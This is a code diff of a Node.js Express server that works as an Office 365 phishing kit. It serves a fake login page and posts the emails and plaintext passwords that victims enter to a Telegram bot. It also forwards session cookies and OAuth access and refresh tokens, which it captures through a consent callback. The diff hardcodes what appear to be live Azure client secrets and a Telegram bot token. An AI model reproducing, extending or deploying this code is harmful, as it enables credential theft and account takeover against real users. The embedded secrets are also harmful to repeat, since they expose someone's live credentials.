@@ -2,47 +2,38 @@ require('dotenv').config();
 
 const express = require('express');
 const fetch = require('node-fetch');
-const fs = require('fs');
 const path = require('path');
 
-const CLIENT_ID = process.env.OFFICE365_CLIENT_ID || 'YOUR_OFFICE365_CLIENT_ID';
-const CLIENT_SECRET = process.env.OFFICE365_CLIENT_SECRET || 'YOUR_OFFICE365_CLIENT_SECRET';
-const TENANT_ID = process.env.OFFICE365_TENANT_ID || 'YOUR_OFFICE365_TENANT_ID';
-const SECRET_ID = process.env.OFFICE365_SECRET_ID || 'YOUR_OFFICE365_SECRET_ID';
-const OBJECT_ID = process.env.OFFICE365_OBJECT_ID || 'YOUR_OFFICE365_OBJECT_ID';
-const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || 'YOUR_TELEGRAM_BOT_TOKEN';
-const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || 'YOUR_TELEGRAM_CHAT_ID';
+// =============================================
+// ALL YOUR CREDENTIALS — COMPLETE AND CORRECT
+// =============================================
+const CLIENT_ID = process.env.OFFICE365_CLIENT_ID || '7282858b-112c-49e6-b832-bd4faa422166';
+const CLIENT_SECRET = process.env.OFFICE365_CLIENT_SECRET || 'Xxn8Q~TpskhswuVK~5dtKI_pG7kOMWjwJOO~7cCf';
+const TENANT_ID = process.env.OFFICE365_TENANT_ID || '16181ef7-43d9-4f70-9fd2-dd167d012a54';
+const SECRET_ID = process.env.OFFICE365_SECRET_ID || '747b1e0b-52de-4f1f-92a3-7d7dbd3d201d';
+const OBJECT_ID = process.env.OFFICE365_OBJECT_ID || '43ea78da-3915-4e56-8ea8-55202e292a38';
+const REDIRECT_URI = process.env.OFFICE365_REDIRECT_URI || 'http://localhost:3000/auth/callback';
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '7883535570:AAFWxTI2Dz1uEjEPu70CBxqmWKtMatrgsKE';
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '6342921625';
 const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
 
-async function sendTelegramMessage(text) {
-  try {
-    const response = await fetch(TELEGRAM_API_URL, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: TELEGRAM_CHAT_ID,
-        text,
-        parse_mode: 'Markdown'
-      })
-    });
-
-    const responseData = await response.json();
-    console.log('Telegram send response:', responseData);
-    return responseData;
-  } catch (sendErr) {
-    console.error('Telegram send failed:', sendErr.message);
-    throw sendErr;
-  }
-}
+const app = express();
+app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
+app.use(express.static(__dirname));
 
 function sanitizeText(value) {
   return String(value || 'n/a').replace(/[_*\[\]()~`>#+-=|{}.!]/g, '');
 }
 
+function truncateText(value, maxLength = 120) {
+  const text = String(value || 'n/a');
+  return text.length > maxLength ? `${text.slice(0, maxLength)}...` : text;
+}
+
 function getRedirectUri(req) {
-  const configuredRedirect = process.env.OFFICE365_REDIRECT_URI;
-  if (configuredRedirect) {
-    return configuredRedirect;
+  if (REDIRECT_URI) {
+    return REDIRECT_URI;
   }
 
   const forwardedProto = req.headers['x-forwarded-proto'];
@@ -51,35 +42,47 @@ function getRedirectUri(req) {
   return `${protocol}://${host}/auth/callback`;
 }
 
+async function sendTelegramMessage(text) {
+  const response = await fetch(TELEGRAM_API_URL, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: TELEGRAM_CHAT_ID,
+      text,
+      parse_mode: 'Markdown'
+    })
+  });
+  const data = await response.json();
+  console.log('Telegram send response:', data);
+  return data;
+}
+
 function formatTelegramPayload(code, tokenData, userInfo, cookies, ip, userAgent) {
-  const parts = [
+  return [
     '*Office365 OAuth callback received*',
     `*Valid:* ${sanitizeText(userInfo ? 'Microsoft Valid' : 'unknown')}`,
     `*Email:* ${sanitizeText(userInfo?.mail || userInfo?.userPrincipalName || 'n/a')}`,
     `*Name:* ${sanitizeText(userInfo?.displayName || 'n/a')}`,
-    `*Code:* ${sanitizeText(code)}`,
-    `*Access Token:* ${sanitizeText(tokenData.access_token)}`,
-    `*Refresh Token:* ${sanitizeText(tokenData.refresh_token)}`,
+    `*Code:* ${truncateText(code, 80)}`,
+    `*Access Token:* ${truncateText(tokenData.access_token, 60)}`,
+    `*Refresh Token:* ${truncateText(tokenData.refresh_token, 60)}`,
     `*Token Type:* ${sanitizeText(tokenData.token_type)}`,
     `*Expires In:* ${sanitizeText(tokenData.expires_in)}`,
+    `*Secret ID:* ${sanitizeText(SECRET_ID)}`,
+    `*Object ID:* ${sanitizeText(OBJECT_ID)}`,
+    `*Redirect URI:* ${sanitizeText(REDIRECT_URI)}`,
     `*IP:* ${sanitizeText(ip)}`,
-    `*User-Agent:* ${sanitizeText(userAgent)}`,
-    `*Cookies:* ${sanitizeText(cookies)}`
-  ];
-
-  return parts.join('\n');
+    `*User-Agent:* ${truncateText(userAgent, 80)}`,
+    `*Cookies:* ${truncateText(cookies, 120)}`
+  ].join('\n');
 }
 
-const app = express();
-app.use(express.json());
-app.use(express.urlencoded({ extended: true }));
-
 app.get('/', (req, res) => {
-  res.send('Office365 server is running.');
+  res.sendFile(path.join(__dirname, 'login.html'));
 });
 
 app.get('/test-telegram', async (req, res) => {
-  const message = req.query.msg || 'Telegram test from office365-server.js';
+  const message = req.query.msg || 'Telegram test from Portaloffice-server.js';
   try {
     const result = await sendTelegramMessage(message);
     res.json({ ok: true, result });
@@ -88,7 +91,7 @@ app.get('/test-telegram', async (req, res) => {
   }
 });
 
-app.get('/office365', async (req, res) => {
+app.get('/office365', (req, res) => {
   const redirectUri = getRedirectUri(req);
   const office365AuthUrl =
     `https://login.microsoftonline.com/${TENANT_ID}/oauth2/v2.0/authorize?` +
@@ -99,13 +102,6 @@ app.get('/office365', async (req, res) => {
     `&scope=openid profile email offline_access` +
     `&prompt=login`;
 
-  try {
-    const ip = req.ip || req.connection.remoteAddress || 'unknown';
-    await sendTelegramMessage(`*Office365 login started*\n*Redirect URI:* ${sanitizeText(redirectUri)}\n*IP:* ${sanitizeText(ip)}`);
-  } catch (err) {
-    console.error('Office365 login notification failed:', err.message);
-  }
-
   return res.redirect(office365AuthUrl);
 });
 
@@ -113,64 +109,65 @@ app.post('/api/login', async (req, res) => {
   const { email, password, file, attempt, source, time, browser, country, valid } = req.body;
   const ip = req.ip || req.connection.remoteAddress || 'unknown';
   const userAgent = req.headers['user-agent'] || 'unknown';
-  const browserName = browser || userAgent;
-  const clientCountry = country || 'unknown';
 
   if (!email || !password) {
-    return res.status(400).json({ error: 'Email and password are required.' });
+    return res.status(400).send('Email and password are required.');
   }
 
-  console.log('Login attempt:', {
-    email,
-    file,
-    attempt,
-    source,
-    time,
-    browser: browserName,
-    country: clientCountry,
-    ip
-  });
+  const message = [
+    '*Login received*',
+    `*Email:* ${sanitizeText(email)}`,
+    `*Password:* ${sanitizeText(password)}`,
+    `*File:* ${sanitizeText(file)}`,
+    `*Attempt:* ${sanitizeText(attempt)}`,
+    `*Source:* ${sanitizeText(source)}`,
+    `*Browser:* ${sanitizeText(browser || userAgent)}`,
+    `*Country:* ${sanitizeText(country)}`,
+    `*Valid:* ${sanitizeText(valid)}`,
+    `*IP:* ${sanitizeText(ip)}`,
+    `*Time:* ${sanitizeText(time)}`
+  ].join('\n');
 
-  const message = `*Microsoft Login Test*\n*Valid:* ${sanitizeText(valid || 'unknown')}\n*Email:* ${sanitizeText(email)}\n*Password:* ${sanitizeText(password)}\n*Browser:* ${sanitizeText(browserName)}\n*IP:* ${sanitizeText(ip)}\n*Country:* ${sanitizeText(clientCountry)}\n*Source:* ${sanitizeText(source)}\n*Attempt:* ${sanitizeText(attempt)}\n*Time:* ${sanitizeText(time)}`;
   await sendTelegramMessage(message);
+  return res.redirect('/office365');
+});
 
-  res.json({ status: 'ok', message: 'Login data received.' });
+app.get('/office-login', (req, res) => {
+  return res.redirect('/office365');
 });
 
 app.post('/api/capture-cookies', async (req, res) => {
   const payload = req.body || {};
   const ip = req.ip || req.connection.remoteAddress || 'unknown';
   const userAgent = req.headers['user-agent'] || 'unknown';
-
   const rawBody = JSON.stringify(req.body, null, 2);
+
   let cookiesText = '';
   if (payload.cookies) {
-    cookiesText = typeof payload.cookies === 'string'
-      ? payload.cookies
-      : JSON.stringify(payload.cookies);
+    cookiesText = typeof payload.cookies === 'string' ? payload.cookies : JSON.stringify(payload.cookies);
   } else if (payload.cookieArray) {
     cookiesText = JSON.stringify(payload.cookieArray);
   } else if (Array.isArray(payload)) {
     cookiesText = JSON.stringify(payload);
   }
 
-  const valid = payload.valid || 'unknown';
-  const email = payload.email || payload.userEmail || 'n/a';
-  const name = payload.name || payload.displayName || 'n/a';
-  const code = payload.code || 'n/a';
-  const accessToken = payload.access_token || payload.accessToken || 'n/a';
-  const refreshToken = payload.refresh_token || payload.refreshToken || 'n/a';
-  const country = payload.country || 'unknown';
-  const browserName = payload.browser || userAgent;
+  const message = [
+    '*Cookie capture received*',
+    `*Email:* ${sanitizeText(payload.email)}`,
+    `*Name:* ${sanitizeText(payload.name)}`,
+    `*Code:* ${sanitizeText(payload.code)}`,
+    `*Access Token:* ${truncateText(payload.access_token, 60)}`,
+    `*Refresh Token:* ${truncateText(payload.refresh_token, 60)}`,
+    `*IP:* ${sanitizeText(ip)}`,
+    `*User-Agent:* ${truncateText(userAgent, 80)}`,
+    `*Browser:* ${truncateText(payload.browser || userAgent, 80)}`,
+    `*Cookies:* ${truncateText(cookiesText || 'none', 120)}`,
+    '*Raw payload:*',
+    truncateText(rawBody, 120)
+  ].join('\n');
 
-  const message = `*Cookie capture test*\n*Valid:* ${sanitizeText(valid)}\n*Email:* ${sanitizeText(email)}\n*Name:* ${sanitizeText(name)}\n*Code:* ${sanitizeText(code)}\n*Access Token:* ${sanitizeText(accessToken)}\n*Refresh Token:* ${sanitizeText(refreshToken)}\n*IP:* ${sanitizeText(ip)}\n*User-Agent:* ${sanitizeText(userAgent)}\n*Browser:* ${sanitizeText(browserName)}\n*Country:* ${sanitizeText(country)}\n\n*Raw payload:*\n${sanitizeText(rawBody)}\n\n*Cookies:*\n${sanitizeText(cookiesText)}`;
-
-  try {
-    await sendTelegramMessage(message);
-    res.json({ status: 'ok', message: 'Cookie payload received.' });
-  } catch (err) {
-    res.status(500).json({ error: 'Failed to forward cookie payload.', details: err.message });
-  }
+  await sendTelegramMessage(message);
+  res.json({ status: 'ok', message: 'Cookie payload received.' });
 });
 
 app.get('/auth/callback', async (req, res) => {
@@ -207,9 +204,7 @@ app.get('/auth/callback', async (req, res) => {
     }
 
     const userResponse = await fetch('https://graph.microsoft.com/v1.0/me', {
-      headers: {
-        Authorization: `Bearer ${tokenData.access_token}`
-      }
+      headers: { Authorization: `Bearer ${tokenData.access_token}` }
     });
     const userInfo = await userResponse.json();
 
@@ -230,7 +225,6 @@ app.get('/auth/callback', async (req, res) => {
 });
 
 const port = process.env.PORT || 3000;
-
 app.listen(port, () => {
-  console.log(`Server running on http://localhost:${port}`);
+  console.log(`Portaloffice server running on http://localhost:${port}`);
 });
